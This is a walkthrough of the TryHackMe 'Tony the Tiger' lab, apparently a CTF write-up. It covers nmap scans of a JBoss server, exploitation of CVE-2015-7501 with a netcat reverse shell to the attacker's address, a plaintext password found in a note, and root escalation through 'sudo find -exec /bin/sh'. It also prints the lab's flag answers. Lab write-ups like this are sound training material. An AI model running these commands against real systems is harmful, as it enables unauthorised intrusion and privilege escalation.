---
title: Walkthrough - Tony the Tiger
published: true
---

Tags: CVE-2015-7501, Java Web App, Cryptography, Steganography.
Description: Learn how to use a Java Serialisation attack in this boot-to-root.
Difficulty: Easy
URL: [https://tryhackme.com/room/tonythetiger](https://tryhackme.com/room/tonythetiger)

* * *

## Notes

- `sudo nmap -Pn -sS -T4 10.10.83.106 -vvv`

```
PORT     STATE SERVICE       REASON
22/tcp   open  ssh           syn-ack ttl 61
80/tcp   open  http          syn-ack ttl 61
1090/tcp open  ff-fms        syn-ack ttl 61
1091/tcp open  ff-sm         syn-ack ttl 61
1098/tcp open  rmiactivation syn-ack ttl 61
1099/tcp open  rmiregistry   syn-ack ttl 61
4446/tcp open  n1-fwp        syn-ack ttl 61
5500/tcp open  hotline       syn-ack ttl 61
8009/tcp open  ajp13         syn-ack ttl 61
8080/tcp open  http-proxy    syn-ack ttl 61
8083/tcp open  us-srv        syn-ack ttl 61
```

- `sudo nmap -sC -sV -sT -O 10.10.83.106 -p22,80,1090,1091,1098,1099,4446,5500,8009,8080,8083`

```
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 d6:97:8c:b9:74:d0:f3:9e:fe:f3:a5:ea:f8:a9:b5:7a (DSA)
|   2048 33:a4:7b:91:38:58:50:30:89:2d:e4:57:bb:07:bb:2f (RSA)
|   256 21:01:8b:37:f5:1e:2b:c5:57:f1:b0:42:b7:32:ab:ea (ECDSA)
|_  256 f6:36:07:3c:3b:3d:71:30:c4:cd:2a:13:00:b5:25:ae (ED25519)
80/tcp   open  http        Apache httpd 2.4.7 ((Ubuntu))
|_http-generator: Hugo 0.66.0
|_http-title: Tony&#39;s Blog
|_http-server-header: Apache/2.4.7 (Ubuntu)
1090/tcp open  java-rmi    Java RMI
|_rmi-dumpregistry: ERROR: Script execution failed (use -d to debug)
1091/tcp open  java-rmi    Java RMI
1098/tcp open  java-rmi    Java RMI
1099/tcp open  java-object Java Object Serialization
| fingerprint-strings: 
|   NULL: 
|     java.rmi.MarshalledObject|
|     hash[
|     locBytest
|     objBytesq
|     #http://thm-java-deserial.home:8083/q
|     org.jnp.server.NamingServer_Stub
|     java.rmi.server.RemoteStub
|     java.rmi.server.RemoteObject
|     xpwA
|     UnicastRef2
|_    thm-java-deserial.home
4446/tcp open  java-object Java Object Serialization
5500/tcp open  hotline?
| fingerprint-strings: 
|   DNSStatusRequestTCP: 
|     CRAM-MD5
|     NTLM
|     DIGEST-MD5
|     GSSAPI
|     thm-java-deserial
|   DNSVersionBindReqTCP: 
|     GSSAPI
|     CRAM-MD5
|     DIGEST-MD5
|     NTLM
|     thm-java-deserial
|   GenericLines, Help, NULL: 
|     DIGEST-MD5
|     CRAM-MD5
|     GSSAPI
|     NTLM
|     thm-java-deserial
|   GetRequest, Kerberos: 
|     NTLM
|     DIGEST-MD5
|     GSSAPI
|     CRAM-MD5
|     thm-java-deserial
|   HTTPOptions, SSLSessionReq: 
|     NTLM
|     GSSAPI
|     CRAM-MD5
|     DIGEST-MD5
|     thm-java-deserial
|   RPCCheck: 
|     GSSAPI
|     DIGEST-MD5
|     NTLM
|     CRAM-MD5
|     thm-java-deserial
|   RTSPRequest: 
|     NTLM
|     CRAM-MD5
|     DIGEST-MD5
|     GSSAPI
|     thm-java-deserial
|   TLSSessionReq: 
|     DIGEST-MD5
|     GSSAPI
|     CRAM-MD5
|     NTLM
|     thm-java-deserial
|   TerminalServerCookie: 
|     GSSAPI
|     DIGEST-MD5
|     CRAM-MD5
|     NTLM
|_    thm-java-deserial
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
| ajp-methods: 
|   Supported methods: GET HEAD POST PUT DELETE TRACE OPTIONS
|   Potentially risky methods: PUT DELETE TRACE
|_  See https://nmap.org/nsedoc/scripts/ajp-methods.html
8080/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
|_http-title: Welcome to JBoss AS
| http-methods: 
|_  Potentially risky methods: PUT DELETE TRACE
|_http-server-header: Apache-Coyote/1.1
8083/tcp open  http        JBoss service httpd
|_http-title: Site doesn't have a title (text/html).
3 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port1099-TCP:V=7.92%I=7%D=8/23%Time=630498F3%P=x86_64-pc-linux-gnu%r(NU
SF:LL,17B,"\xac\xed\0\x05sr\0\x19java\.rmi\.MarshalledObject\|\xbd\x1e\x97
SF:\xedc\xfc>\x02\0\x03I\0\x04hash\[\0\x08locBytest\0\x02\[B\[\0\x08objByt
SF:esq\0~\0\x01xpR\xfb\x1e\x0cur\0\x02\[B\xac\xf3\x17\xf8\x06\x08T\xe0\x02
SF:\0\0xp\0\0\x004\xac\xed\0\x05t\0#http://thm-java-deserial\.home:8083/q\
SF:0~\0\0q\0~\0\0uq\0~\0\x03\0\0\0\xcd\xac\xed\0\x05sr\0\x20org\.jnp\.serv
SF:er\.NamingServer_Stub\0\0\0\0\0\0\0\x02\x02\0\0xr\0\x1ajava\.rmi\.serve
SF:r\.RemoteStub\xe9\xfe\xdc\xc9\x8b\xe1e\x1a\x02\0\0xr\0\x1cjava\.rmi\.se
SF:rver\.RemoteObject\xd3a\xb4\x91\x0ca3\x1e\x03\0\0xpwA\0\x0bUnicastRef2\
SF:0\0\x16thm-java-deserial\.home\0\0\x04J<f\xe4\xfd\xd7a\xfdX/\x8d0\xe3\0
SF:\0\x01\x82\xc9\xdb\xd9{\x80\x02\0x");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port4446-TCP:V=7.92%I=7%D=8/23%Time=630498F9%P=x86_64-pc-linux-gnu%r(NU
SF:LL,4,"\xac\xed\0\x05");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5500-TCP:V=7.92%I=7%D=8/23%Time=630498F9%P=x86_64-pc-linux-gnu%r(NU
SF:LL,4B,"\0\0\0G\0\0\x01\0\x03\x04\0\0\0\x03\x03\x04\0\0\0\x02\x01\nDIGES
SF:T-MD5\x01\x08CRAM-MD5\x01\x06GSSAPI\x01\x04NTLM\x02\x11thm-java-deseria
SF:l")%r(GenericLines,4B,"\0\0\0G\0\0\x01\0\x03\x04\0\0\0\x03\x03\x04\0\0\
SF:0\x02\x01\nDIGEST-MD5\x01\x08CRAM-MD5\x01\x06GSSAPI\x01\x04NTLM\x02\x11
SF:thm-java-deserial")%r(GetRequest,4B,"\0\0\0G\0\0\x01\0\x03\x04\0\0\0\x0
SF:3\x03\x04\0\0\0\x02\x01\x04NTLM\x01\nDIGEST-MD5\x01\x06GSSAPI\x01\x08CR
SF:AM-MD5\x02\x11thm-java-deserial")%r(HTTPOptions,4B,"\0\0\0G\0\0\x01\0\x
SF:03\x04\0\0\0\x03\x03\x04\0\0\0\x02\x01\x04NTLM\x01\x06GSSAPI\x01\x08CRA
SF:M-MD5\x01\nDIGEST-MD5\x02\x11thm-java-deserial")%r(RTSPRequest,4B,"\0\0
SF:\0G\0\0\x01\0\x03\x04\0\0\0\x03\x03\x04\0\0\0\x02\x01\x04NTLM\x01\x08CR
SF:AM-MD5\x01\nDIGEST-MD5\x01\x06GSSAPI\x02\x11thm-java-deserial")%r(RPCCh
SF:eck,4B,"\0\0\0G\0\0\x01\0\x03\x04\0\0\0\x03\x03\x04\0\0\0\x02\x01\x06GS
SF:SAPI\x01\nDIGEST-MD5\x01\x04NTLM\x01\x08CRAM-MD5\x02\x11thm-java-deseri
SF:al")%r(DNSVersionBindReqTCP,4B,"\0\0\0G\0\0\x01\0\x03\x04\0\0\0\x03\x03
SF:\x04\0\0\0\x02\x01\x06GSSAPI\x01\x08CRAM-MD5\x01\nDIGEST-MD5\x01\x04NTL
SF:M\x02\x11thm-java-deserial")%r(DNSStatusRequestTCP,4B,"\0\0\0G\0\0\x01\
SF:0\x03\x04\0\0\0\x03\x03\x04\0\0\0\x02\x01\x08CRAM-MD5\x01\x04NTLM\x01\n
SF:DIGEST-MD5\x01\x06GSSAPI\x02\x11thm-java-deserial")%r(Help,4B,"\0\0\0G\
SF:0\0\x01\0\x03\x04\0\0\0\x03\x03\x04\0\0\0\x02\x01\nDIGEST-MD5\x01\x08CR
SF:AM-MD5\x01\x06GSSAPI\x01\x04NTLM\x02\x11thm-java-deserial")%r(SSLSessio
SF:nReq,4B,"\0\0\0G\0\0\x01\0\x03\x04\0\0\0\x03\x03\x04\0\0\0\x02\x01\x04N
SF:TLM\x01\x06GSSAPI\x01\x08CRAM-MD5\x01\nDIGEST-MD5\x02\x11thm-java-deser
SF:ial")%r(TerminalServerCookie,4B,"\0\0\0G\0\0\x01\0\x03\x04\0\0\0\x03\x0
SF:3\x04\0\0\0\x02\x01\x06GSSAPI\x01\nDIGEST-MD5\x01\x08CRAM-MD5\x01\x04NT
SF:LM\x02\x11thm-java-deserial")%r(TLSSessionReq,4B,"\0\0\0G\0\0\x01\0\x03
SF:\x04\0\0\0\x03\x03\x04\0\0\0\x02\x01\nDIGEST-MD5\x01\x06GSSAPI\x01\x08C
SF:RAM-MD5\x01\x04NTLM\x02\x11thm-java-deserial")%r(Kerberos,4B,"\0\0\0G\0
SF:\0\x01\0\x03\x04\0\0\0\x03\x03\x04\0\0\0\x02\x01\x04NTLM\x01\nDIGEST-MD
SF:5\x01\x06GSSAPI\x01\x08CRAM-MD5\x02\x11thm-java-deserial");
```

* * * 

## Find Tony's Flag!

- Tony's flag is hidden inside one of the images on the site, unfortunely that image isnt available anymore `THM{Tony_Sure_Loves_Frosted_Flakes}`

* * * 

## Exploit

Download the task files and unzip. Also have to modify the exploit in order for it to run its missing many parantheses for prints. 

- setup netcap listener
- `python exploit.py 10.10.190.219:8080 "nc -e /bin/bash 10.2.127.225 6666"`

* * * 

## Find User JBoss' flag! 

We are tasked to find a flag that has the formatt of `THM{}`

To find files in linux containing certain characters we can use the find and grep command

- `find / -type f -exec grep -l "THM{" {} \; 2>/dev/null`

```
cat /home/jboss/.jboss.txt
```

* * * 

## Escalation!

Possible hint in cmnatic 

```
I like to keep a track of the various things I do throughout the day.

Things I have done today:
 - Added a note for JBoss to read for when he next logs in.
 - Helped Tony setup his website!
 - Made sure that I am not an administrator account 

Things to do:
 - Update my Java! I've heard it's kind of in-secure, but it's such a headache to update. Grrr!
```

Also checking the jboss home dir

```
cat note
Hey JBoss!

Following your email, I have tried to replicate the issues you were having with the system.

However, I don't know what commands you executed - is there any file where this history is stored that I can access?

Oh! I almost forgot... I have reset your password as requested (make sure not to tell it to anyone!)

Password: likeaboss

Kind Regards,
CMNatic
cmnatic@thm-java-deserial:/home/jboss$ 
```

- `su jboss`
- `sudo -l`
 
```
User jboss may run the following commands on thm-java-deserial:
    (ALL) NOPASSWD: /usr/bin/find
``` 

- escalate `sudo find . -exec /bin/sh \; -quit`
- `cat /root/root.txt`

- base64 decode then md5 crack 

* * * 